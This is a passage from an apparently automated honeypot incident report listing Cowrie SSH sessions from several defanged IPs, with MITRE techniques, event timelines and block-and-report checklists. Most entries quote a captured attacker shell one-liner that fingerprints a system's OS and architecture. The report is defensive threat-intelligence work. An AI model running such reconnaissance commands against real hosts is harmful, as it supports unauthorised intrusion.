| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:32:18` | `cowrie.session.connect` |
| `2026-09-03 10:32:18` | `cowrie.client.version` |
| `2026-09-03 10:32:19` | `cowrie.client.kex` |
| `2026-09-03 10:32:20` | `cowrie.login.success` |
| `2026-09-03 10:32:21` | `cowrie.session.params` |
| `2026-09-03 10:32:21` | `cowrie.command.input` |
| `2026-09-03 10:32:21` | `cowrie.command.failed` |
| `2026-09-03 10:32:21` | `cowrie.log.closed` |
| `2026-09-03 10:32:22` | `cowrie.session.params` |
| `2026-09-03 10:32:22` | `cowrie.command.input` |
| `2026-09-03 10:32:23` | `cowrie.session.file_download` |
| `2026-09-03 10:32:23` | `cowrie.log.closed` |
| `2026-09-03 10:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fa6689ac7a4

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-09-03 10:32 |
| **Last Seen** | 2026-09-03 10:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:32:23` | `cowrie.session.connect` |
| `2026-09-03 10:32:23` | `cowrie.client.version` |
| `2026-09-03 10:32:23` | `cowrie.client.kex` |
| `2026-09-03 10:32:24` | `cowrie.login.success` |
| `2026-09-03 10:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f19854c2b381

| Field | Detail |
|---|---|
| **Source IP** | `147.50.231[.]135` |
| **First Seen** | 2026-09-03 10:32 |
| **Last Seen** | 2026-09-03 10:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:32:25` | `cowrie.session.connect` |
| `2026-09-03 10:32:25` | `cowrie.client.version` |
| `2026-09-03 10:32:25` | `cowrie.client.kex` |
| `2026-09-03 10:32:26` | `cowrie.login.success` |
| `2026-09-03 10:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.50.231[.]135` to AbuseIPDB if not already reported
- [ ] Block `147.50.231[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec29b010165c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:32 |
| **Last Seen** | 2026-09-03 10:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:32:30` | `cowrie.session.connect` |
| `2026-09-03 10:32:30` | `cowrie.client.version` |
| `2026-09-03 10:32:30` | `cowrie.client.kex` |
| `2026-09-03 10:32:32` | `cowrie.login.success` |
| `2026-09-03 10:32:34` | `cowrie.session.params` |
| `2026-09-03 10:32:34` | `cowrie.command.input` |
| `2026-09-03 10:32:34` | `cowrie.command.input` |
| `2026-09-03 10:32:34` | `cowrie.command.input` |
| `2026-09-03 10:32:34` | `cowrie.command.input` |
| `2026-09-03 10:32:34` | `cowrie.command.input` |
| `2026-09-03 10:32:34` | `cowrie.command.success` |
| `2026-09-03 10:32:34` | `cowrie.command.input` |
| `2026-09-03 10:32:34` | `cowrie.command.input` |
| `2026-09-03 10:32:34` | `cowrie.command.input` |
| `2026-09-03 10:32:34` | `cowrie.command.input` |
| `2026-09-03 10:32:35` | `cowrie.log.closed` |
| `2026-09-03 10:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-222db4d974e5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:33 |
| **Last Seen** | 2026-09-03 10:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:33:38` | `cowrie.session.connect` |
| `2026-09-03 10:33:38` | `cowrie.client.version` |
| `2026-09-03 10:33:38` | `cowrie.client.kex` |
| `2026-09-03 10:33:40` | `cowrie.login.success` |
| `2026-09-03 10:33:42` | `cowrie.session.params` |
| `2026-09-03 10:33:42` | `cowrie.command.input` |
| `2026-09-03 10:33:42` | `cowrie.command.input` |
| `2026-09-03 10:33:42` | `cowrie.command.input` |
| `2026-09-03 10:33:42` | `cowrie.command.input` |
| `2026-09-03 10:33:42` | `cowrie.command.input` |
| `2026-09-03 10:33:42` | `cowrie.command.success` |
| `2026-09-03 10:33:42` | `cowrie.command.input` |
| `2026-09-03 10:33:42` | `cowrie.command.input` |
| `2026-09-03 10:33:42` | `cowrie.command.input` |
| `2026-09-03 10:33:42` | `cowrie.command.input` |
| `2026-09-03 10:33:42` | `cowrie.log.closed` |
| `2026-09-03 10:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-375dc00c0e3e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:34 |
| **Last Seen** | 2026-09-03 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:34:32` | `cowrie.session.connect` |
| `2026-09-03 10:34:32` | `cowrie.client.version` |
| `2026-09-03 10:34:32` | `cowrie.client.kex` |
| `2026-09-03 10:34:33` | `cowrie.login.success` |
| `2026-09-03 10:34:33` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:34:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:34:33` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:34:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7aeae179123

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:34 |
| **Last Seen** | 2026-09-03 10:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:34:45` | `cowrie.session.connect` |
| `2026-09-03 10:34:46` | `cowrie.client.version` |
| `2026-09-03 10:34:46` | `cowrie.client.kex` |
| `2026-09-03 10:34:47` | `cowrie.login.success` |
| `2026-09-03 10:34:49` | `cowrie.session.params` |
| `2026-09-03 10:34:49` | `cowrie.command.input` |
| `2026-09-03 10:34:49` | `cowrie.command.input` |
| `2026-09-03 10:34:49` | `cowrie.command.input` |
| `2026-09-03 10:34:49` | `cowrie.command.input` |
| `2026-09-03 10:34:49` | `cowrie.command.input` |
| `2026-09-03 10:34:49` | `cowrie.command.success` |
| `2026-09-03 10:34:49` | `cowrie.command.input` |
| `2026-09-03 10:34:49` | `cowrie.command.input` |
| `2026-09-03 10:34:49` | `cowrie.command.input` |
| `2026-09-03 10:34:49` | `cowrie.command.input` |
| `2026-09-03 10:34:49` | `cowrie.log.closed` |
| `2026-09-03 10:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b096d08f484

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 10:35 |
| **Last Seen** | 2026-09-03 10:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:35:43` | `cowrie.session.connect` |
| `2026-09-03 10:35:43` | `cowrie.client.version` |
| `2026-09-03 10:35:43` | `cowrie.client.kex` |
| `2026-09-03 10:35:44` | `cowrie.login.success` |
| `2026-09-03 10:35:44` | `cowrie.direct-tcpip.request` |
| `2026-09-03 10:35:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 10:35:44` | `cowrie.direct-tcpip.data` |
| `2026-09-03 10:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-530158e67c9c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:35 |
| **Last Seen** | 2026-09-03 10:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:35:53` | `cowrie.session.connect` |
| `2026-09-03 10:35:53` | `cowrie.client.version` |
| `2026-09-03 10:35:53` | `cowrie.client.kex` |
| `2026-09-03 10:35:54` | `cowrie.login.success` |
| `2026-09-03 10:35:56` | `cowrie.session.params` |
| `2026-09-03 10:35:56` | `cowrie.command.input` |
| `2026-09-03 10:35:56` | `cowrie.command.input` |
| `2026-09-03 10:35:56` | `cowrie.command.input` |
| `2026-09-03 10:35:56` | `cowrie.command.input` |
| `2026-09-03 10:35:56` | `cowrie.command.input` |
| `2026-09-03 10:35:56` | `cowrie.command.success` |
| `2026-09-03 10:35:56` | `cowrie.command.input` |
| `2026-09-03 10:35:56` | `cowrie.command.input` |
| `2026-09-03 10:35:56` | `cowrie.command.input` |
| `2026-09-03 10:35:56` | `cowrie.command.input` |
| `2026-09-03 10:35:56` | `cowrie.log.closed` |
| `2026-09-03 10:35:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98565560b8a4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:37 |
| **Last Seen** | 2026-09-03 10:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:37:01` | `cowrie.session.connect` |
| `2026-09-03 10:37:01` | `cowrie.client.version` |
| `2026-09-03 10:37:01` | `cowrie.client.kex` |
| `2026-09-03 10:37:02` | `cowrie.login.success` |
| `2026-09-03 10:37:04` | `cowrie.session.params` |
| `2026-09-03 10:37:04` | `cowrie.command.input` |
| `2026-09-03 10:37:04` | `cowrie.command.input` |
| `2026-09-03 10:37:04` | `cowrie.command.input` |
| `2026-09-03 10:37:04` | `cowrie.command.input` |
| `2026-09-03 10:37:04` | `cowrie.command.input` |
| `2026-09-03 10:37:04` | `cowrie.command.success` |
| `2026-09-03 10:37:04` | `cowrie.command.input` |
| `2026-09-03 10:37:04` | `cowrie.command.input` |
| `2026-09-03 10:37:04` | `cowrie.command.input` |
| `2026-09-03 10:37:04` | `cowrie.command.input` |
| `2026-09-03 10:37:04` | `cowrie.log.closed` |
| `2026-09-03 10:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faf80a07a1f0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:38 |
| **Last Seen** | 2026-09-03 10:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:38:10` | `cowrie.session.connect` |
| `2026-09-03 10:38:10` | `cowrie.client.version` |
| `2026-09-03 10:38:10` | `cowrie.client.kex` |
| `2026-09-03 10:38:12` | `cowrie.login.success` |
| `2026-09-03 10:38:14` | `cowrie.session.params` |
| `2026-09-03 10:38:14` | `cowrie.command.input` |
| `2026-09-03 10:38:14` | `cowrie.command.input` |
| `2026-09-03 10:38:14` | `cowrie.command.input` |
| `2026-09-03 10:38:14` | `cowrie.command.input` |
| `2026-09-03 10:38:14` | `cowrie.command.input` |
| `2026-09-03 10:38:14` | `cowrie.command.success` |
| `2026-09-03 10:38:14` | `cowrie.command.input` |
| `2026-09-03 10:38:14` | `cowrie.command.input` |
| `2026-09-03 10:38:14` | `cowrie.command.input` |
| `2026-09-03 10:38:14` | `cowrie.command.input` |
| `2026-09-03 10:38:14` | `cowrie.log.closed` |
| `2026-09-03 10:38:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9fca3219a6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:39 |
| **Last Seen** | 2026-09-03 10:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:39:21` | `cowrie.session.connect` |
| `2026-09-03 10:39:21` | `cowrie.client.version` |
| `2026-09-03 10:39:21` | `cowrie.client.kex` |
| `2026-09-03 10:39:22` | `cowrie.login.success` |
| `2026-09-03 10:39:23` | `cowrie.session.params` |
| `2026-09-03 10:39:23` | `cowrie.command.input` |
| `2026-09-03 10:39:23` | `cowrie.command.input` |
| `2026-09-03 10:39:23` | `cowrie.command.input` |
| `2026-09-03 10:39:23` | `cowrie.command.input` |
| `2026-09-03 10:39:23` | `cowrie.command.input` |
| `2026-09-03 10:39:23` | `cowrie.command.success` |
| `2026-09-03 10:39:23` | `cowrie.command.input` |
| `2026-09-03 10:39:23` | `cowrie.command.input` |
| `2026-09-03 10:39:23` | `cowrie.command.input` |
| `2026-09-03 10:39:23` | `cowrie.command.input` |
| `2026-09-03 10:39:23` | `cowrie.log.closed` |
| `2026-09-03 10:39:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8fb7d222c18

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:40 |
| **Last Seen** | 2026-09-03 10:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:40:31` | `cowrie.session.connect` |
| `2026-09-03 10:40:31` | `cowrie.client.version` |
| `2026-09-03 10:40:31` | `cowrie.client.kex` |
| `2026-09-03 10:40:32` | `cowrie.login.success` |
| `2026-09-03 10:40:33` | `cowrie.session.params` |
| `2026-09-03 10:40:33` | `cowrie.command.input` |
| `2026-09-03 10:40:33` | `cowrie.command.input` |
| `2026-09-03 10:40:33` | `cowrie.command.input` |
| `2026-09-03 10:40:33` | `cowrie.command.input` |
| `2026-09-03 10:40:33` | `cowrie.command.input` |
| `2026-09-03 10:40:33` | `cowrie.command.success` |
| `2026-09-03 10:40:33` | `cowrie.command.input` |
| `2026-09-03 10:40:33` | `cowrie.command.input` |
| `2026-09-03 10:40:33` | `cowrie.command.input` |
| `2026-09-03 10:40:33` | `cowrie.command.input` |
| `2026-09-03 10:40:33` | `cowrie.log.closed` |
| `2026-09-03 10:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc98ec5a013

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:41 |
| **Last Seen** | 2026-09-03 10:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:41:44` | `cowrie.session.connect` |
| `2026-09-03 10:41:44` | `cowrie.client.version` |
| `2026-09-03 10:41:44` | `cowrie.client.kex` |
| `2026-09-03 10:41:45` | `cowrie.login.success` |
| `2026-09-03 10:41:46` | `cowrie.session.params` |
| `2026-09-03 10:41:46` | `cowrie.command.input` |
| `2026-09-03 10:41:46` | `cowrie.command.input` |
| `2026-09-03 10:41:46` | `cowrie.command.input` |
| `2026-09-03 10:41:46` | `cowrie.command.input` |
| `2026-09-03 10:41:46` | `cowrie.command.input` |
| `2026-09-03 10:41:46` | `cowrie.command.success` |
| `2026-09-03 10:41:46` | `cowrie.command.input` |
| `2026-09-03 10:41:46` | `cowrie.command.input` |
| `2026-09-03 10:41:46` | `cowrie.command.input` |
| `2026-09-03 10:41:46` | `cowrie.command.input` |
| `2026-09-03 10:41:47` | `cowrie.log.closed` |
| `2026-09-03 10:41:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c575731fe60

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 10:42 |
| **Last Seen** | 2026-09-03 10:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 10:42:57` | `cowrie.session.connect` |
| `2026-09-03 10:42:57` | `cowrie.client.version` |
| `2026-09-03 10:42:57` | `cowrie.client.kex` |
| `2026-09-03 10:42:58` | `cowrie.login.success` |
| `2026-09-03 10:42:59` | `cowrie.session.params` |
| `2026-09-03 10:42:59` | `cowrie.command.input` |
| `2026-09-03 10:42:59` | `cowrie.command.input` |
| `2026-09-03 10:42:59` | `cowrie.command.input` |
| `2026-09-03 10:42:59` | `cowrie.command.input` |
| `2026-09-03 10:42:59` | `cowrie.command.input` |
| `2026-09-03 10:42:59` | `cowrie.command.success` |
| `2026-09-03 10:42:59` | `cowrie.command.input` |
| `2026-09-03 10:42:59` | `cowrie.command.input` |
